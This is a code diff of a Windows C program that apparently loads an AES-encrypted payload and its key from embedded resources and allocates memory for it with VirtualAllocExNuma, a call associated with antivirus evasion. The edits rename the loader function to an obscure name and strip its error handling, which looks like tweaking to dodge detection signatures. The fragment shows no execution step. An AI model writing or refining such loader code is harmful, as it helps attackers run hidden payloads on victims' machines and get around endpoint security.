@@ -4,14 +4,10 @@
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
 
-void DataLoadBaby(const char* resName, char** data, DWORD* size) {
+void laddrems(const char* resName, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
     HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
-    if (!hResource) {
-        printf("Resource %s not found!\n", resName);
-        exit(1);
-    }
-
+    
     HGLOBAL hResData = LoadResource(hModule, hResource);
     *size = SizeofResource(hModule, hResource);
     *data = (char*)LockResource(hResData);
@@ -35,11 +31,11 @@ int main() {
 
     char* AESkey;
     DWORD AESkeyLen;
-    DataLoadBaby("AESKEY", &AESkey, &AESkeyLen);
+    laddrems("AESKEY", &AESkey, &AESkeyLen);
 
     char* AESCode;
     DWORD AESCodeLen;
-    DataLoadBaby("AESCODE", &AESCode, &AESCodeLen);
+    laddrems("AESCODE", &AESCode, &AESCodeLen);
 
     LPVOID memalo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
     //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
